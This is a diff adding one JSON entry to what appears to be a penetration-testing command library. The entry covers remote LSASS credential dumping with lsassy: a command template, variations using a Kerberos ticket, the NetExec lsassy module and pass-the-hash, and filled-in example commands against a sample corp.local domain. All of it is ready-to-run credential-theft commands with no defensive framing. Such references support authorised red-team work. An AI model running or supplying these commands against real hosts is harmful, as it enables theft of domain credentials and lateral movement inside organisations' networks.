@@ -1,0 +1,42 @@
+{
+  "id": "lsassy",
+  "name": "Lsassy LSASS Dump",
+  "command": "lsassy -u '<user>' -p '<password>' -d '<domain>' -dc-ip <dc_ip> <ip>",
+  "description": "Remotely dump LSASS credentials using lsassy",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "lsassy",
+    "lsass",
+    "credentials",
+    "dump",
+    "remote"
+  ],
+  "variations": [
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "lsassy -k --no-pass -d '<domain>' <ip>"
+    },
+    {
+      "label": "NetExec Module",
+      "requires": "password",
+      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M lsassy"
+    },
+    {
+      "label": "NetExec Module (Hash)",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M lsassy"
+    }
+  ],
+  "examples": [
+    "lsassy -u 'user' -p 'password' -d 'corp.local' -dc-ip 192.168.1.2 192.168.1.31",
+    "lsassy -k --no-pass -d 'corp.local' us-mssql.corp.local",
+    "nxc smb '192.168.1.31' -u 'user' -p 'password' -M lsassy"
+  ]
+}
